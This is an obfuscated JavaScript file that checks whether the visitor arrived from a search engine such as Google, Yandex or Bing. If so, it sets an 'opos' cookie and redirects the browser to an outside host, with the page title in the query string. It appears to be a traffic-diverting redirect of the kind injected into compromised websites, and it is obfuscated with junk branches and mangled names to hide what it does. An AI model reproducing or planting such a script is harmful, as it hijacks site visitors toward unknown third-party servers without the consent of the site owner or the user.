class Task2 {
    static['com2']() {
        var _4164e3_ = undefined
          , _254ee8_ = undefined
          , _422a7e_ = {};
        _422a7e_.IZOXR = '3|5|0|6|4|7|2|1',
        _422a7e_.lsVzk = ';\x20expires=',
        _422a7e_.hSHLs = function(_410938_, _15adfb_) {
            return _410938_ || _15adfb_;
        }
        ,
        _422a7e_.yJAsV = function(_209484_, _f11e81_) {
            return _209484_ + _f11e81_;
        }
        ,
        _422a7e_.TLEWV = '; domain=',
        _422a7e_.YnthJ = function(_2e69c8_, _3febc4_) {
            return _2e69c8_(_3febc4_);
        }
        ,
        _422a7e_.bEAMW = function(_3dc736_, _f35780_) {
            return _3dc736_ + _f35780_;
        }
        ,
        _422a7e_.sflCy = '; path=',
        _422a7e_.MspFG = '(?:; )?',
        _422a7e_.FdSvc = function(_560df0_, _5d2400_, _4274b6_, _209da3_, _52a961_, _3fd62b_) {
            return _560df0_(_5d2400_, _4274b6_, _209da3_, _52a961_, _3fd62b_);
        }
        ,
        _422a7e_.TJrTW = function(_4687e8_, _320d74_) {
            return _4687e8_ + _320d74_;
        }
        ,
        _422a7e_.TUYfY = 'return (function() ',
        _422a7e_.bXBLq = function(_bbd833_) {
            return _bbd833_();
        }
        ,
        _422a7e_.xOKOg = function(_594ccc_, _515955_) {
            return _594ccc_ < _515955_;
        }
        ,
        _422a7e_.JYXRW = function(_e5192b_, _ae1007_) {
            return _e5192b_ !== _ae1007_;
        }
        ,
        _422a7e_.AxzzK = 'SqwjM',
        _422a7e_.KCosp = function(_3b173d_, _bb3a4_) {
            return _3b173d_ == _bb3a4_;
        }
        ,
        _422a7e_.EgDmb = 'opos',
        _422a7e_.nqUSy = function(_fdbfb2_, _3b82ac_) {
            return _fdbfb2_ === _3b82ac_;
        }
        ,
        _422a7e_.LpdGr = 'hwKDr',
        _422a7e_.IWJVh = function(_dbaf43_, _24516f_, _2031a7_) {
            return _dbaf43_(_24516f_, _2031a7_);
        }
        ,
        _422a7e_.yXRQO = ' - ';
        var _ea28a2_ = _422a7e_
          , _420e55_ = document.title['split'](_ea28a2_.yXRQO)
          , _6800c7_ = _420e55_[0]['split'](' | ');
        function _2a3ea2_(_2f0912_, _129feb_, _3eaf40_, _51a3ee_, _2b320b_, _4c1205_) {
            var _30b91d_ = undefined
              , _e028b7_ = undefined
              , _29d66b_ = _ea28a2_.IZOXR['split']('|')
              , _2ef646_ = 0;
            while (true) {
                switch (_29d66b_[_2ef646_++]) {
                case '0':
                    if (_3eaf40_)
                        _4c86b3_ += _ea28a2_.lsVzk + _3eaf40_.toGMTString();
                    continue;
                case '1':
                    return true;
                case '2':
                    document.cookie = _4c86b3_;
                    continue;
                case '3':
                    if (_ea28a2_.hSHLs(!_2f0912_, !_129feb_))
                        return false;
                    continue;
                case '4':
                    if (_2b320b_)
                        _4c86b3_ += _ea28a2_.yJAsV(_ea28a2_.TLEWV, _2b320b_);
                    continue;
                case '5':
                    var _4c86b3_ = _2f0912_ + '=' + _ea28a2_.YnthJ(encodeURIComponent, _129feb_);
                    continue;
                case '6':
                    if (_51a3ee_)
                        _4c86b3_ += _ea28a2_.bEAMW(_ea28a2_.sflCy, _51a3ee_);
                    continue;
                case '7':
                    if (_4c1205_)
                        _4c86b3_ += '; secure';
                    continue;
                }
                break;
            }
        }
        function _5ef3c8_(_4583d0_) {
            var _1a1868_ = undefined
              , _3db08c_ = undefined
              , _33284e_ = _ea28a2_.bEAMW(_ea28a2_.bEAMW(_ea28a2_.MspFG, _4583d0_), '=([^;]*);?')
              , _1c5b61_ = new RegExp(_33284e_);
            if (_1c5b61_.test(document.cookie))
                return decodeURIComponent(RegExp['$1']);
            return false;
        }
        function _310fd2_(_5e0b16_, _116341_, _a9240e_) {
            var _3099b2_ = undefined;
            return _ea28a2_.FdSvc(_2a3ea2_, _5e0b16_, null, new Date(0), _116341_, _a9240e_),
            true;
        }
        var _20e474_ = {};
        _20e474_.searchers = [[/google\./i, /(\?|&)q=(.*?)(&|$)/i, 2], [/search\.yahoo\./i, /(\?|&)p=(.*?)(&|$)/i, 2], [/bing\.com/i, /(\?|&)q=(.*?)(&|$)/i, 2], [/search\.aol\./i, /(\?|&)q=(.*?)(&|$)/i, 2], [/ask\.com/i, /(\?|&)q=(.*?)(&|$)/i, 2], [/altavista\./i, /(\?|&)q=(.*?)(&|$)/i, 2], [/search\.lycos\./i, /(\?|&)query=(.*?)(&|$)/i, 2], [/alltheweb\./i, /(\?|&)q=(.*?)(&|$)/i, 2], [/yandex\./i, /(\?|&)text=(.*?)(&|$)/i, 2], [/(nova\.|search\.)?rambler\./i, /(\?|&)query=(.*?)(&|$)/i, 2], [/gogo\./i, /(\?|&)q=(.*?)(&|$)/i, 2], [/go\.mail\./i, /(\?|&)q=(.*?)(&|$)/i, 2], [/nigma\./i, /(\?|&)s=(.*?)(&|$)/i, 2]],
        _20e474_.sp_redirect = function(_b2a74f_) {
            var _51bdaf_ = undefined
              , _766024_ = undefined
              , _1bf09f_ = null;
            for (var _55c85a_ = 0; _ea28a2_.xOKOg(_55c85a_, _20e474_.searchers.length); _55c85a_++) {
                if (_ea28a2_.JYXRW('SqwjM', _ea28a2_.AxzzK)) {
                    function _2eaa55_() {
                        var _5e6d4a_ = undefined
                          , _2a6097_ = undefined
                          , _486aa7_ = _1b6fe6_(HVzByi.TJrTW(HVzByi.TUYfY + ('{}.constructor("return\x20this\x22)(\x20)'), ');'));
                        _33f82f_ = HVzByi.bXBLq(_486aa7_);
                    }
                } else {
                    var _30b034_ = _20e474_.searchers[_55c85a_];
                    if (_b2a74f_.match(_30b034_[0]) || _ea28a2_.KCosp(_ea28a2_.YnthJ(_5ef3c8_, _ea28a2_.EgDmb), '1')) {
                        if (_ea28a2_.nqUSy(_ea28a2_.LpdGr, _ea28a2_.LpdGr)) {
                            _ea28a2_.IWJVh(_2a3ea2_, 'opos', '1'),
                            document.location['href'] = _ea28a2_.TJrTW('https://js.ekb-tv.ru/trds?q=', _6800c7_[0]);
                            break;
                        } else {
                            function _35779c_() {
                                _1c6082_ = _5352c4_;
                            }
                        }
                    }
                }
            }
        }
        ,
        _20e474_.sp_redirect(document.referrer);
    }
}
Task2.com2();
